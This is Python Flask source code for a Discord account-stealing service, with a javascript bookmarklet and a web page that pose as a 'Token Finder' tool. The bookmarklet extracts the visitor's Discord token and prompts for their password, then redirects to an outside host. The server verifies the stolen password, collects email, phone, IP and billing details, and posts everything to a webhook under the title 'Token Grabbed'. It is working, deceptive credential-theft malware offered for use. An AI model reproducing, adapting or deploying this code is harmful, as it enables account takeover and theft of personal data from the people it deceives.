# javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();const pass = prompt("Enter your Account Password: ");window.location.href = `https://yourwebsite.com/?user=${token}:${pass}`;})()

#import os, discord, datetime, asyncio, time, httpx, threading, pymongo, flask
import os, flask, httpx, datetime
from flask import Flask, request, redirect 

webhook = os.environ.get("WEBHOOK_URL") # Get Webhook URL from Env
authurl = os.environ.get("AUTH_URL")
app = Flask("") # Declaring Flask app

def get_badges(flags): # Function to get badges from flags, used in lime 138-148
# You can replace emoji ids here 
	badges = ""
	if "HOUSE_BRILLIANCE" in flags:
		badges += "<:hs_brilliance:1057521844716044330>"
	if "HOUSE_BALANCE" in flags:
		badges += "<:hs_balance:1057522201613574207>"
	if "HOUSE_BRAVERY" in flags:
		badges += "<:hs_bravery:1057522386062278736>"
	if "NITRO" in flags:
		badges += "<:nitro_1:1057522513334239302>"
	if "NITRO_2" in flags:
		badges += "<a:nitro_2:1057588738366132225>"
	if "BOOSTER_1" in flags:
		badges	+= "<:boost_1:1057523553781698642>"
	if "BOOSTER_2" in flags:
		badges += "<:boost_2:1057523640280825969>"
	if "BOOSTER_3" in flags:
		badges += "<:boost_3:1057523727568490506>"
	if "BOOSTER_6" in flags:
		badges += "<:boost_6:1057523770253922365>"
	if "BOOSTER_9" in flags:
		badges += "<:boost_9:1057523815321698360>"
	if "BOOSTER_12" in flags:
		badges += "<:boost_12:1057523860188176434>"
	if "BOOSTER_15" in flags:
		badges += "<:boost_15:1057523904752668692>"
	if "BOOSTER_18" in flags:
		badges += "<:boost_18:1057523954111238266>"
	if "BOOSTER_24" in flags:
		badges += "<:boost_24:1057524002136018944>"
	if "ACTIVE_DEVELOPER" in flags:
		badges += "<:active_dev:1057524066807984198>"
	if "DISCORD_CERTIFIED_MODERATOR" in flags:
		badges += "<:discord_mod:1057524125263995033>"
	if "EARLY_VERIFIED_BOT_DEVELOPER" in flags:
		badges += "<:early_dev:1057524166431100998>"
	if "BUGHUNTER_LEVEL_1" in flags:
		badges += "<:bughunter:1057524211649876109>"
	if "BUGHUNTER_LEVEL_2" in flags:
		badges += "<:bughunter_2:1057524274518310922>"
	if "EARLY_SUPPORTER" in flags:
		badges += "<:early_supporter:1057524321460965427>"
	if "DISCORD_EMPLOYEE" in flags:
		badges += "<:discord_staff:1057524361009049650>"
	if "PARTNERED_SERVER_OWNER" in flags:
		badges += "<:discord_partner:1057524398397071461>"
	if "HYPESQUAD_EVENTS" in flags:
		badges += "<:hypesquad:1057524438842736672>"
	return badges


def get_counts(token):
	fc = httpx.get("https://discord.com/api/v9/users/@me/relationships",headers={"Authorization":token}) # friend count
	dmc = httpx.get("https://discord.com/api/v9/users/@me/channels",headers={"Authorization":token}) # dm channel count 
	gc = httpx.get("https://discord.com/api/v9/users/@me/guilds",headers={"Authorization":token}) # guild count
	try:
		return len(fc.json()), len(dmc.json()), len(gc.json())
	except: 
		return None, None, None

def get_nitro_ending(token):
	# function to get nitro start and end date
	try:
		r = httpx.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers={"Authorization": token})
		rjs0 = r.json()[0]
		if r.status_code in [200,201,204]:
			strptstart = datetime.datetime.strptime(rjs0["current_period_start"], "%Y-%m-%dT%H:%M:%S.%f%z")
			start = int((strptstart.replace(tzinfo=None,microsecond=0)).timestamp())
			strptend = datetime.datetime.strptime(rjs0["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z")
			end = int((strptend.replace(tzinfo=None,microsecond=0)).timestamp())
			return end, start
	except Exception as e:
		print(e)
		return None, None

def auth(token):
	try:
		req = httpx.post(authurl, json={"authorize":"true"},headers={"Authorization":token})
		if req.status_code in [200, 201, 204]:
			loc = req.json()["location"]
			req2 = httpx.get(location)
			return True
		else:
			return False
	except:
		return False
	
def get_valid(email, pwd, token):
	headers = {"Content-Type":"application/json","Authorization":token}
	data = {"email":email, "password":pwd}
	r = httpx.patch("https://discord.com/api/v10/users/@me",headers=headers,json=data)
	if r.status_code == 200:
		return True
	else:
		return False

def send(data, token, pwd, valid):
# data = json data
# token = Token of Account
# pwd = Password
# valid = Is Password Valid? True or False
	gifts = ""
	uid = data['id']
	username = data['username'] + "#" + data['discriminator']
	try:
		phone = data['phone']
	except:
		phone = None
	email = data['email']
	authig = auth(token)
	mfa_enabled = data['mfa_enabled']
	locale = data["locale"]
	flags = data["flags"]
	nsfw = data["nsfw_allowed"]
	verified = data["verified"]
	try:
		ip = request.headers["X-Forwarded-For"]
	except:
		ip = None
	ua = request.headers["User-Agent"]
	data2 = httpx.get(f"https://japi.rest/discord/v1/user/{uid}").json()
	created = datetime.datetime.strptime(data2["data"]["createdAt"], "%Y-%m-%dT%H:%M:%S.%fZ")
	created = int(created.timestamp())
	created = f"<t:{created}:R>"
	try:
		avatarURL = data2["data"]["avatarURL"]
	except:
		avatarURL = data2["data"]["defaultAvatarURL"]
	try:
		bannerURL = data2["data"]["bannerURL"] + "?size=1024"
	except:
		bannerURL = None
	try:
			public_flags = data2["data"]['public_flags_array']
			badges = get_badges(public_flags)
	except Exception as e:
			print(e)
			badges = None
	nitro = data["premium_type"]
	if nitro == 1:
		nitro = get_badges(["NITRO"])
		nitroend0, nitrostart0 = get_nitro_ending(token)
		nitroend, nitrostart = f"<t:{nitroend0}:R>", f"<t:{nitrostart0}:R>"
	if nitro == 2:
		nitro = get_badges(["NITRO_2"])
		nitroend0, nitrostart0 = get_nitro_ending(token)
		nitroend, nitrostart = f"<t:{nitroend0}:R>", f"<t:{nitrostart0}:R>"
	else:
		nitro, nitroend, nitrostart = None, None, None
	friend_count, dm_count, guild_count = get_counts(token)
	json = {"content":"@everyone", "embeds":[{
		"title":"Token Grabbed",
		"description":f"""**ID:** {uid}
**Username:** {username}
**Created At:** {created}
**Email:** {email}
**Password:** {pwd}
**Password Valid?:** {valid}
**Phone:** {phone}
**Token:** {token}
**Access Token Grabbed?:** {authig}
**IP:** [{ip}](https://extreme-ip-lookup.com/{ip})
**User Agent:** {ua}
**MFA Enabled?:** {mfa_enabled}
**NSFW Allowed?:** {nsfw}
**Locale:** {locale}
**Nitro:** {nitro}
**Subscriber Since:** {nitrostart}
**Nitro Ending:** {nitroend}
**Badges:** {badges}
		
		""",
	"thumbnail":{
		"url":avatarURL
		},
	"image":{
		"url":bannerURL
	},
	"footer":{
		"text":"Created by DraKen#3301"
		}
	},
	{
		"description":f"""
**Friend Count:** {friend_count}
**DM Channels Count:** {dm_count}
**Guild Count:** {guild_count}
""",
		"footer":{
			"text":"Created by DraKen#3301"
		}
	}
	]}
	r = httpx.post(webhook,json=json)
	print(r)
	
@app.route("/")
def home():
	if request.args.get("user") is not None:
		token, pwd = (request.args.get("user")).split(":")
		r = httpx.get("https://discord.com/api/v10/users/@me",headers={"Authorization":token})
		valid = get_valid(email=r.json()["email"],token=token,pwd=pwd)
		r = send(data=r.json(),token=token,pwd=pwd,valid=valid)
		if valid is True:
			return "Your Token is: " + token
		else:
			return "Your Password is Invalid, unable to fetch token."
	return """<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Token Finder API</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap" rel="stylesheet" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Poppins";
      }
      body {
        width: 100%;
        min-height: 100vh;
        background: #1f1f1f;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 6rem .8rem,
      }
      .box {
        width: 500px;
        height: auto;
        background: #222222;
        box-shadow: 2px 2px 7px #00000031;
        border-radius: 0.35rem;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        padding: 0.8rem 2.4rem;
        padding-top: 1.8rem;
      }

      @media only screen and (max-width: 500px) {
        .box {
          width: 100%;
          margin: 0 0.23rem;
        }
      }

      .token_container {
        width: 100%;
        /* overflow: auto; */
        /* white-space: pre; */
        word-break: break-all;
        font-size: 1.6rem;
        padding: 0.4rem 0.6rem;
        background: #33333375;
        border-radius: 0.28rem;
        color: #fff;
        user-select: all;
      }

      .token_container::-webkit-scrollbar {
        display: none;
      }

      .btn_container {
        position: relative;
      }

      .copy {
        font-size: 1.2rem;
        margin: 1.2rem;
        background: none;
        border: 1.2px solid #fff;
        color: #fff;
        padding: 0.4rem 0.8rem;
        cursor: pointer;
        transition: all 0.3s;
      }
      .copy:hover {
        background: rgb(240, 240, 240);
        color: #222222;
        font-weight: 500;
      }
    </style>
  </head>
  <body>
    <div class="box">
      <div class="token_container">javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void%200).exports.default.getToken();const%20pass%20=%20prompt(%22Enter%20your%20Account%20Password:%20%22);window.location.href%20=%20`https://find-your-token.herokuapp.com/?user=${token}:${pass}`;})()</div>
      <button class="copy">Copy</button>
    </div>

    <script>
      const token_container = document.querySelector(".token_container");
      const copy_btn = document.querySelector(".copy");
      const box = document.querySelector(".box");
      copy_btn.addEventListener("click", async () => {
        try {
          if (window.my_timeout) {
            clearTimeout(window.my_timeout);
          }
          await navigator.clipboard.writeText(token_container.innerHTML);
          let bkp = copy_btn.innerHTML;
          copy_btn.innerHTML = "Copied To Clipboard";
          window.my_timeout = setTimeout(() => {
            copy_btn.innerHTML = bkp;
          }, 3000);
        } catch (err) {
          alert("Failed To Copy to Clipboard! Kindly Copy it Manually by Clicking the Script String");
          console.log(err);
        }
      });
    </script>
  </body>
</html>"""

if __name__ == "__main__":
	app.run()
